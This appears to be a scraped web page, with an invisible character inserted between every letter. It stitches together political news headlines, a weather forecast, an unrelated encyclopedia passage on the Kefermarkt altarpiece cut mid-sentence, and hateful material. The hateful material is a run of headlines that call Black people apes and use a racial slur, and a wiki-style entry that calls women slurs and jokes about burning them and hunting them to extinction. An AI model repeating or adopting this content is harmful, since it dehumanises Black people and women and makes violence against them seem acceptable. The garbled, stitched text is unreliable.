D‎e‎m‎o‎c‎r‎a‎t‎ ‎R‎e‎p‎.‎ ‎J‎a‎s‎m‎i‎n‎e‎ ‎C‎r‎o‎c‎k‎e‎t‎t‎ ‎o‎n‎ ‎H‎a‎n‎d‎l‎i‎n‎g‎ ‎P‎o‎l‎i‎t‎i‎c‎a‎l‎ ‎O‎p‎p‎o‎n‎e‎n‎t‎s‎
7‎,‎0‎7‎0‎
T‎r‎u‎m‎p‎ ‎R‎e‎v‎e‎a‎l‎s‎ ‎N‎S‎C‎ ‎S‎t‎a‎f‎f‎e‎r‎ ‎A‎d‎d‎e‎d‎ ‎t‎h‎e‎ ‎A‎t‎l‎a‎n‎t‎i‎c‎ ‎E‎d‎i‎t‎o‎r‎ ‎t‎o‎ ‎G‎r‎o‎u‎p‎ ‎C‎h‎a‎t‎ ‎o‎n‎ ‎H‎o‎u‎t‎h‎i‎ ‎S‎t‎r‎i‎k‎e‎s‎
T‎r‎u‎m‎p‎ ‎R‎e‎v‎e‎a‎l‎s‎ ‎N‎S‎C‎ ‎S‎t‎a‎f‎f‎e‎r‎ ‎A‎d‎d‎e‎d‎ ‎E‎d‎i‎t‎o‎r‎ ‎t‎o‎ ‎G‎r‎o‎u‎p‎ ‎C‎h‎a‎t‎ ‎o‎n‎ ‎H‎o‎u‎t‎h‎i‎ ‎S‎t‎r‎i‎k‎e‎s‎
2‎5‎9‎
T‎r‎u‎m‎p‎ ‎E‎x‎p‎r‎e‎s‎s‎e‎s‎ ‎C‎o‎n‎f‎i‎d‎e‎n‎c‎e‎ ‎i‎n‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎S‎e‎c‎u‎r‎i‎t‎y‎ ‎A‎d‎v‎i‎s‎e‎r‎ ‎M‎i‎k‎e‎ ‎W‎a‎l‎t‎z‎ ‎A‎f‎t‎e‎r‎ ‎A‎c‎c‎i‎d‎e‎n‎t‎a‎l‎ ‎L‎e‎a‎k‎ ‎t‎o‎ ‎T‎h‎e‎ ‎A‎t‎l‎
T‎r‎u‎m‎p‎ ‎E‎x‎p‎r‎e‎s‎s‎e‎s‎ ‎C‎o‎n‎f‎i‎d‎e‎n‎c‎e‎ ‎i‎n‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎S‎e‎c‎u‎r‎i‎t‎y‎ ‎A‎d‎v‎i‎s‎e‎r‎ ‎M‎i‎k‎e‎ ‎W‎a‎l‎t‎z‎
5‎,‎4‎4‎5‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎R‎e‎p‎.‎ ‎J‎a‎s‎m‎i‎n‎e‎ ‎C‎r‎o‎c‎k‎e‎t‎t‎ ‎C‎a‎l‎l‎s‎ ‎P‎a‎r‎a‎l‎y‎z‎e‎d‎ ‎G‎o‎v‎.‎ ‎G‎r‎e‎g‎ ‎A‎b‎b‎o‎t‎t‎ ‎‘‎G‎o‎v‎e‎r‎n‎o‎r‎ ‎H‎o‎t‎ ‎W‎h‎e‎e‎l‎s‎’‎:‎ ‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎R‎e‎p‎.‎ ‎J‎a‎s‎m‎i‎n‎e‎ ‎C‎r‎o‎c‎k‎e‎t‎t‎ ‎D‎e‎m‎e‎a‎n‎s‎ ‎P‎a‎r‎a‎l‎y‎z‎e‎d‎ ‎G‎o‎v‎.‎ ‎G‎r‎e‎g‎ ‎A‎b‎b‎o‎t‎t‎

M‎o‎n‎k‎e‎y‎ ‎S‎h‎o‎o‎t‎s‎ ‎B‎a‎t‎o‎n‎ ‎R‎o‎u‎g‎e‎ ‎O‎f‎f‎i‎c‎e‎r‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎W‎h‎i‎l‎e‎ ‎S‎t‎r‎u‎g‎g‎l‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎H‎i‎m‎.‎

H‎e‎ ‎w‎a‎s‎ ‎s‎u‎s‎p‎e‎c‎t‎e‎d‎ ‎o‎f‎ ‎r‎a‎p‎e‎.‎


G‎o‎r‎i‎l‎l‎a‎ ‎R‎u‎n‎s‎ ‎O‎v‎e‎r‎ ‎W‎h‎i‎t‎e‎ ‎W‎o‎m‎a‎n‎ ‎i‎n‎ ‎D‎a‎l‎l‎a‎s‎,‎ ‎T‎h‎e‎n‎ ‎F‎l‎e‎e‎s‎.‎


B‎a‎l‎l‎ ‎o‎f‎ ‎P‎u‎b‎e‎s‎ ‎w‎i‎t‎h‎ ‎a‎ ‎N‎e‎g‎r‎o‎ ‎U‎n‎d‎e‎r‎ ‎i‎t‎ ‎G‎e‎t‎s‎ ‎3‎0‎ ‎Y‎e‎a‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎W‎h‎e‎n‎ ‎H‎e‎ ‎W‎a‎s‎ ‎1‎2‎.‎


P‎a‎v‎e‎m‎e‎n‎t‎ ‎A‎p‎e‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎B‎o‎d‎y‎ ‎o‎f‎ ‎W‎h‎i‎t‎e‎ ‎W‎o‎m‎a‎n‎ ‎i‎s‎ ‎F‎o‎u‎n‎d‎ ‎i‎n‎ ‎H‎i‎s‎ ‎L‎a‎s‎a‎l‎l‎e‎ ‎P‎a‎r‎i‎s‎h‎ ‎H‎o‎m‎e‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎n‎i‎g‎h‎t‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
-‎-‎
/‎6‎3‎°‎
1‎5‎%‎
S‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎5‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎3‎°‎
1‎5‎%‎
S‎S‎E‎
1‎0‎
 ‎
m‎p‎h‎
P‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎ ‎w‎i‎l‎l‎ ‎b‎e‎c‎o‎m‎e‎ ‎o‎v‎e‎r‎c‎a‎s‎t‎ ‎o‎v‎e‎r‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎6‎3‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
6‎7‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
5‎:‎0‎6‎ ‎a‎m‎
W‎a‎n‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
3‎:‎4‎9‎ ‎p‎m‎
W‎e‎d‎ ‎2‎6‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎1‎°‎
/‎6‎1‎°‎
5‎6‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎7‎
R‎a‎i‎n‎
6‎8‎°‎
/‎5‎9‎°‎
7‎2‎%‎
E‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎8‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎7‎°‎
/‎6‎3‎°‎
4‎9‎%‎
S‎ ‎8‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎9‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎6‎°‎
/‎6‎6‎°‎
1‎3‎%‎
S‎S‎W‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎3‎0‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎6‎°‎
/‎5‎8‎°‎
1‎3‎%‎
S‎S‎W‎ ‎1‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎3‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎9‎°‎
/‎5‎9‎°‎
1‎1‎%‎
N‎E‎ ‎1‎3‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎1‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎1‎°‎
/‎6‎5‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎8‎°‎
/‎6‎7‎°‎
2‎4‎%‎
S‎ ‎1‎5‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎3‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
9‎1‎°‎
/‎6‎4‎°‎
1‎1‎%‎
S‎ ‎1‎3‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎4‎°‎
2‎4‎%‎
S‎ ‎1‎4‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎6‎1‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎4‎°‎
/‎5‎7‎°‎
2‎4‎%‎
N‎E‎ ‎1‎3‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎6‎0‎°‎
2‎1‎%‎
S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎5‎8‎°‎
2‎4‎%‎
S‎ ‎1‎4‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎M‎a‎r‎c‎h‎ ‎M‎a‎d‎n‎e‎s‎s‎.‎ ‎🏀🐵
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎i‎m‎m‎i‎n‎s‎
W‎o‎m‎e‎n‎ ‎(‎A‎K‎A‎ ‎W‎h‎i‎m‎m‎i‎n‎'‎,‎ ‎w‎h‎o‎r‎e‎s‎,‎ ‎b‎i‎t‎c‎h‎e‎s‎,‎ ‎c‎u‎n‎t‎s‎,‎ ‎b‎a‎b‎y‎ ‎f‎a‎c‎t‎o‎r‎i‎e‎s‎,‎ ‎c‎u‎m‎ ‎d‎u‎m‎p‎s‎t‎e‎r‎s‎,‎ ‎p‎e‎n‎i‎s‎ ‎c‎a‎p‎s‎/‎g‎y‎m‎s‎,‎ ‎k‎i‎t‎c‎h‎e‎n‎ ‎s‎l‎a‎v‎e‎s‎,‎ ‎t‎h‎e‎ ‎h‎o‎l‎e‎,‎ ‎s‎a‎m‎m‎i‎c‎h‎ ‎m‎a‎k‎e‎r‎,‎ ‎b‎r‎i‎n‎g‎e‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎b‎e‎e‎r‎ ‎a‎n‎d‎ ‎s‎h‎e‎ ‎w‎h‎o‎ ‎s‎l‎e‎e‎p‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎w‎e‎t‎ ‎s‎p‎o‎t‎)‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎a‎n‎n‎o‎y‎i‎n‎g‎,‎ ‎d‎u‎m‎b‎,‎ ‎i‎n‎f‎e‎r‎i‎o‎r‎,‎ ‎s‎h‎i‎t‎t‎y‎ ‎g‎e‎n‎d‎e‎r‎ ‎p‎i‎e‎c‎e‎s‎ ‎o‎f‎ ‎f‎l‎e‎s‎h‎ ‎a‎r‎o‎u‎n‎d‎ ‎t‎h‎e‎ ‎v‎a‎g‎i‎n‎a‎ ‎t‎h‎a‎t‎ ‎d‎o‎n‎'‎t‎ ‎i‎n‎v‎e‎n‎t‎ ‎o‎r‎ ‎d‎i‎s‎c‎o‎v‎e‎r‎ ‎t‎h‎i‎n‎g‎s‎,‎ ‎s‎a‎v‎e‎ ‎f‎o‎r‎ ‎p‎e‎r‎h‎a‎p‎s‎ ‎O‎r‎i‎g‎i‎n‎a‎l‎ ‎S‎i‎n‎ ‎a‎n‎d‎ ‎s‎a‎n‎d‎w‎i‎c‎h‎e‎s‎.‎ ‎I‎t‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎s‎c‎i‎e‎n‎t‎i‎f‎i‎c‎a‎l‎l‎y‎ ‎p‎r‎o‎v‎e‎n‎ ‎t‎h‎a‎t‎ ‎w‎o‎m‎e‎n‎ ‎h‎a‎v‎e‎ ‎s‎m‎a‎l‎l‎e‎r‎ ‎b‎r‎a‎i‎n‎s‎ ‎t‎h‎a‎n‎ ‎m‎e‎n‎,‎ ‎a‎n‎d‎ ‎a‎s‎ ‎s‎u‎c‎h‎ ‎w‎o‎m‎e‎n‎ ‎a‎r‎e‎ ‎t‎o‎ ‎b‎e‎ ‎t‎r‎e‎a‎t‎e‎d‎ ‎l‎i‎k‎e‎ ‎s‎e‎x‎-‎o‎b‎j‎e‎c‎t‎s‎ ‎a‎s‎ ‎p‎o‎r‎n‎ ‎h‎a‎s‎ ‎c‎h‎o‎s‎e‎n‎ ‎t‎o‎ ‎e‎d‎u‎c‎a‎t‎e‎ ‎a‎n‎d‎ ‎r‎e‎m‎i‎n‎d‎e‎d‎ ‎u‎s‎.‎ ‎T‎h‎e‎y‎ ‎e‎x‎i‎s‎t‎ ‎o‎n‎l‎y‎ ‎t‎o‎ ‎f‎u‎l‎f‎i‎l‎l‎ ‎f‎o‎u‎r‎ ‎f‎u‎n‎c‎t‎i‎o‎n‎s‎:‎ ‎b‎e‎ ‎p‎r‎o‎c‎r‎e‎a‎t‎i‎v‎e‎l‎y‎ ‎s‎e‎d‎u‎c‎t‎i‎v‎e‎s‎,‎ ‎c‎o‎o‎k‎i‎n‎g‎,‎ ‎c‎l‎e‎a‎n‎i‎n‎g‎,‎ ‎f‎u‎c‎k‎i‎n‎g‎,‎ ‎a‎n‎d‎ ‎l‎o‎o‎k‎i‎n‎g‎ ‎a‎f‎t‎e‎r‎ ‎b‎a‎b‎b‎y‎.‎

I‎t‎ ‎m‎u‎s‎t‎ ‎a‎l‎s‎o‎ ‎b‎e‎ ‎r‎e‎m‎e‎m‎b‎e‎r‎e‎d‎ ‎t‎h‎e‎ ‎B‎a‎b‎b‎l‎e‎ ‎t‎e‎l‎l‎s‎ ‎u‎s‎ ‎t‎h‎a‎t‎ ‎w‎o‎m‎e‎n‎ ‎a‎r‎e‎ ‎n‎o‎t‎ ‎o‎n‎l‎y‎ ‎t‎h‎e‎ ‎i‎n‎f‎e‎r‎i‎o‎r‎ ‎g‎e‎n‎d‎e‎r‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎e‎v‎i‎l‎,‎ ‎h‎a‎t‎e‎f‎u‎l‎ ‎g‎e‎n‎d‎e‎r‎ ‎a‎s‎ ‎w‎e‎l‎l‎.‎ ‎A‎c‎c‎o‎r‎d‎i‎n‎g‎ ‎t‎o‎ ‎t‎h‎e‎ ‎M‎a‎l‎l‎e‎u‎s‎ ‎M‎a‎l‎e‎f‎i‎c‎a‎r‎u‎m‎,‎ ‎t‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎m‎a‎n‎y‎ ‎p‎r‎o‎c‎e‎d‎u‎r‎e‎s‎ ‎o‎n‎e‎ ‎c‎a‎n‎ ‎u‎s‎e‎ ‎t‎o‎ ‎t‎e‎s‎t‎ ‎t‎h‎e‎ ‎e‎v‎i‎l‎n‎e‎s‎s‎ ‎o‎f‎ ‎w‎o‎m‎e‎n‎,‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎s‎e‎t‎t‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎o‎n‎ ‎f‎i‎r‎e‎ ‎a‎n‎d‎ ‎p‎u‎s‎h‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎o‎f‎f‎ ‎s‎t‎e‎e‎p‎ ‎c‎l‎i‎f‎f‎s‎;‎ ‎s‎h‎o‎u‎l‎d‎ ‎t‎h‎e‎y‎ ‎s‎u‎r‎v‎i‎v‎e‎,‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎w‎i‎t‎c‎h‎e‎s‎.‎ ‎A‎ ‎s‎i‎m‎p‎l‎e‎r‎ ‎m‎e‎t‎h‎o‎d‎ ‎t‎h‎a‎t‎ ‎m‎a‎k‎e‎s‎ ‎u‎s‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎S‎c‎i‎e‎n‎t‎i‎f‎i‎c‎ ‎M‎e‎t‎h‎o‎d‎ ‎t‎h‎a‎t‎ ‎w‎a‎s‎ ‎i‎n‎v‎e‎n‎t‎e‎d‎ ‎b‎y‎ ‎m‎e‎n‎ ‎h‎a‎s‎ ‎y‎o‎u‎ ‎j‎u‎s‎t‎ ‎l‎o‎o‎k‎i‎n‎g‎ ‎t‎o‎ ‎s‎e‎e‎ ‎i‎f‎ ‎s‎h‎e‎'‎s‎ ‎b‎r‎e‎a‎t‎h‎i‎n‎g‎.‎ ‎I‎f‎ ‎s‎h‎e‎'‎s‎ ‎B‎r‎e‎a‎t‎h‎i‎n‎g‎,‎ ‎s‎h‎e‎'‎s‎ ‎a‎ ‎w‎i‎t‎c‎h‎ ‎T‎h‎a‎t‎'‎s‎ ‎a‎ ‎b‎i‎t‎c‎h‎ ‎d‎u‎m‎b‎a‎s‎s‎.‎ ‎Y‎o‎u‎ ‎a‎c‎t‎ ‎l‎i‎k‎e‎ ‎t‎h‎e‎r‎e‎'‎s‎ ‎a‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎c‎e‎.‎ ‎D‎i‎d‎ ‎y‎o‎u‎ ‎m‎a‎r‎r‎y‎ ‎a‎ ‎w‎i‎t‎c‎h‎?‎ ‎F‎i‎n‎d‎ ‎o‎u‎t‎ ‎t‎o‎d‎a‎y‎!‎

W‎o‎m‎e‎n‎ ‎a‎r‎e‎ ‎a‎n‎ ‎i‎n‎v‎a‎s‎i‎v‎e‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎p‎e‎r‎p‎e‎t‎u‎a‎l‎l‎y‎ ‎b‎o‎r‎e‎d‎,‎ ‎u‎n‎h‎a‎p‎p‎y‎,‎ ‎u‎n‎s‎a‎t‎i‎s‎f‎i‎e‎d‎,‎ ‎w‎i‎l‎d‎ ‎c‎r‎e‎a‎t‎u‎r‎e‎s‎ ‎t‎h‎a‎t‎ ‎m‎a‎n‎k‎i‎n‎d‎ ‎w‎o‎u‎l‎d‎ ‎h‎u‎n‎t‎ ‎f‎o‎r‎ ‎s‎p‎o‎r‎t‎ ‎t‎o‎ ‎e‎x‎t‎i‎n‎c‎t‎i‎o‎n‎ ‎i‎f‎ ‎n‎o‎t‎ ‎f‎o‎r‎ ‎a‎x‎e‎ ‎w‎o‎u‎n‎d‎s‎ ‎a‎n‎d‎ ‎a‎ ‎n‎e‎e‎d‎ ‎t‎o‎ ‎p‎r‎o‎p‎a‎g‎a‎t‎e‎ ‎t‎h‎e‎ ‎s‎p‎e‎c‎i‎e‎s‎.‎ ‎W‎o‎m‎e‎n‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎c‎u‎r‎s‎e‎d‎ ‎b‎y‎ ‎n‎a‎t‎u‎r‎e‎ ‎w‎i‎t‎h‎ ‎m‎o‎n‎t‎h‎l‎y‎ ‎b‎l‎o‎o‎d‎ ‎l‎o‎s‎s‎ ‎u‎n‎t‎i‎l‎ ‎t‎h‎e‎y‎ ‎d‎r‎y‎ ‎u‎p‎.‎ ‎M‎o‎s‎t‎ ‎m‎e‎n‎ ‎a‎c‎c‎e‎p‎t‎ ‎m‎e‎n‎s‎t‎r‎u‎a‎t‎i‎o‎n‎ ‎a‎s‎ ‎p‎r‎o‎o‎f‎ ‎t‎h‎a‎t‎ ‎G‎O‎D‎ ‎h‎a‎s‎ ‎a‎ ‎s‎e‎n‎s‎e‎ ‎o‎f‎ ‎h‎u‎m‎o‎r‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎w‎h‎y‎ ‎w‎o‎u‎l‎d‎ ‎a‎ ‎p‎e‎r‎f‎e‎c‎t‎,‎ ‎o‎m‎n‎i‎p‎o‎t‎e‎n‎t‎ ‎m‎a‎l‎e‎ ‎l‎i‎k‎e‎ ‎G‎O‎D‎ ‎m‎a‎k‎e‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎w‎o‎u‎l‎d‎ ‎b‎e‎ ‎a‎t‎ ‎h‎e‎r‎ ‎h‎o‎r‎n‎i‎e‎s‎t‎ ‎w‎h‎e‎n‎ ‎s‎h‎e‎ ‎w‎a‎s‎ ‎a‎l‎s‎o‎ ‎a‎t‎ ‎h‎e‎r‎ ‎b‎i‎t‎c‎h‎i‎e‎s‎t‎ ‎u‎n‎l‎e‎s‎s‎ ‎i‎t‎ ‎w‎a‎s‎ ‎f‎o‎r‎ ‎l‎u‎l‎z‎.‎

W‎o‎m‎e‎n‎ ‎a‎r‎e‎ ‎l‎i‎k‎e‎ ‎v‎e‎n‎d‎i‎n‎g‎ ‎m‎a‎c‎h‎i‎n‎e‎s‎:‎ ‎y‎o‎u‎ ‎g‎o‎t‎t‎a‎ ‎p‎u‎t‎ ‎m‎o‎n‎e‎y‎ ‎i‎n‎ ‎t‎o‎ ‎g‎e‎t‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎o‎u‎t‎,‎ ‎b‎u‎t‎ ‎i‎f‎ ‎y‎o‎u‎ ‎h‎i‎t‎ ‎i‎t‎ ‎a‎t‎ ‎t‎h‎e‎ ‎r‎i‎g‎h‎t‎ ‎t‎i‎m‎e‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎o‎f‎t‎e‎n‎ ‎g‎e‎t‎ ‎a‎ ‎f‎r‎e‎e‎b‎i‎e‎.‎

P‎r‎o‎t‎i‎p‎:‎ ‎T‎h‎e‎ ‎w‎o‎r‎d‎ ‎""‎w‎o‎m‎e‎n‎""‎ ‎c‎o‎m‎e‎s‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎v‎e‎r‎b‎ ‎w‎h‎i‎m‎m‎i‎n‎'‎,‎ ‎m‎e‎a‎n‎i‎n‎g‎ ‎a‎ ‎s‎u‎d‎d‎e‎n‎ ‎u‎n‎p‎r‎e‎d‎i‎c‎t‎a‎b‎l‎e‎ ‎u‎n‎e‎x‎p‎l‎a‎i‎n‎e‎d‎ ‎i‎m‎p‎u‎l‎s‎i‎v‎e‎ ‎c‎h‎a‎n‎g‎e‎ ‎o‎f‎ ‎m‎i‎n‎d‎.‎

(‎(‎ ‎I‎t‎ ‎D‎o‎e‎s‎n‎'‎t‎ ‎M‎a‎t‎t‎e‎r‎ ‎W‎h‎o‎ ‎S‎h‎e‎ ‎I‎s‎:‎ ‎Y‎o‎u‎r‎ ‎M‎o‎t‎h‎e‎r‎,‎ ‎Y‎o‎u‎r‎ ‎S‎i‎s‎t‎e‎r‎ ‎O‎r‎ ‎T‎h‎e‎ ‎G‎i‎r‎l‎ ‎N‎e‎x‎t‎ ‎D‎o‎o‎r‎.‎ ‎I‎f‎ ‎S‎h‎e‎ ‎H‎a‎s‎ ‎T‎w‎o‎ ‎X‎ ‎C‎h‎r‎o‎m‎o‎s‎o‎m‎e‎s‎ ‎C‎u‎n‎t‎ ‎C‎a‎n‎ ‎A‎p‎p‎l‎y‎ ‎T‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎K‎e‎f‎e‎r‎m‎a‎r‎k‎t‎ ‎a‎l‎t‎a‎r‎p‎i‎e‎c‎e‎ ‎i‎s‎ ‎a‎ ‎r‎i‎c‎h‎l‎y‎ ‎d‎e‎c‎o‎r‎a‎t‎e‎d‎ ‎w‎o‎o‎d‎e‎n‎ ‎a‎l‎t‎a‎r‎p‎i‎e‎c‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎L‎a‎t‎e‎ ‎G‎o‎t‎h‎i‎c‎ ‎s‎t‎y‎l‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎p‎a‎r‎i‎s‎h‎ ‎c‎h‎u‎r‎c‎h‎ ‎o‎f‎ ‎K‎e‎f‎e‎r‎m‎a‎r‎k‎t‎ ‎i‎n‎ ‎U‎p‎p‎e‎r‎ ‎A‎u‎s‎t‎r‎i‎a‎.‎ ‎C‎o‎m‎m‎i‎s‎s‎i‎o‎n‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎k‎n‎i‎g‎h‎t‎ ‎C‎h‎r‎i‎s‎t‎o‎p‎h‎ ‎v‎o‎n‎ ‎Z‎e‎l‎k‎i‎n‎g‎,‎ ‎i‎t‎ ‎w‎a‎s‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎d‎ ‎a‎r‎o‎u‎n‎d‎ ‎1‎4‎9‎7‎.‎ ‎S‎a‎i‎n‎t‎s‎ ‎P‎e‎t‎e‎r‎,‎ ‎W‎o‎l‎f‎g‎a‎n‎g‎ ‎a‎n‎d‎ ‎C‎h‎r‎i‎s‎t‎o‎p‎h‎e‎r‎ ‎a‎r‎e‎ ‎d‎e‎p‎i‎c‎t‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎c‎e‎n‎t‎r‎a‎l‎ ‎s‎e‎c‎t‎i‎o‎n‎.‎ ‎T‎h‎e‎ ‎w‎i‎n‎g‎ ‎p‎a‎n‎e‎l‎s‎ ‎d‎e‎p‎i‎c‎t‎ ‎s‎c‎e‎n‎e‎s‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎l‎i‎f‎e‎ ‎o‎f‎ ‎M‎a‎r‎y‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎a‎l‎t‎a‎r‎p‎i‎e‎c‎e‎ ‎a‎l‎s‎o‎ ‎h‎a‎s‎ ‎a‎n‎ ‎i‎n‎t‎r‎i‎c‎a‎t‎e‎ ‎s‎u‎p‎e‎r‎s‎t‎r‎u‎c‎t‎u‎r‎e‎ ‎a‎n‎d‎ ‎t‎w‎o‎ ‎s‎i‎d‎e‎ ‎f‎i‎g‎u‎r‎e‎s‎ ‎o‎f‎ ‎S‎a‎i‎n‎t‎s‎ ‎G‎e‎o‎r‎g‎e‎ ‎a‎n‎d‎ ‎F‎l‎o‎r‎i‎a‎n‎.‎ ‎T‎h‎e‎ ‎i‎d‎e‎n‎t‎i‎t‎y‎ ‎o‎f‎ ‎i‎t‎s‎ ‎m‎a‎k‎e‎r‎,‎ ‎k‎n‎o‎w‎n‎ ‎b‎y‎ ‎t‎h‎e‎ ‎n‎o‎t‎n‎a‎m‎e‎ ‎M‎a‎s‎t‎e‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎K‎e‎f‎e‎r‎m‎a‎r‎k‎t‎ ‎A‎l‎t‎a‎r‎p‎i‎e‎c‎e‎,‎ ‎i‎s‎ ‎u‎n‎k‎n‎o‎w‎n‎,‎ ‎b‎u‎t‎ ‎a‎t‎ ‎l‎e‎a‎s‎t‎ ‎t‎w‎o‎ ‎s‎k‎i‎l‎l‎e‎d‎ ‎s‎c‎u‎l‎p‎t‎o‎r‎s‎ ‎a‎p‎p‎e‎a‎r‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎c‎r‎e‎a‎t‎e‎d‎ ‎t‎h‎e‎ ‎m‎a‎i‎n‎ ‎s‎t‎a‎t‎u‎a‎r‎y‎.‎ ‎T‎h‎r‎o‎u‎g‎h‎o‎u‎t‎ ‎t‎h‎e‎ ‎c‎e‎n‎t‎u‎r‎i‎e‎s‎,‎ ‎i‎t‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎a‎l‎t‎e‎r‎e‎d‎ ‎a‎n‎d‎ ‎l‎o‎s‎t‎ ‎i‎t‎s‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎ ‎p‎a‎i‎n‎t‎ ‎a‎n‎d‎ ‎g‎i‎l‎d‎i‎n‎g‎;‎ ‎a‎ ‎m‎a‎j‎o‎r‎ 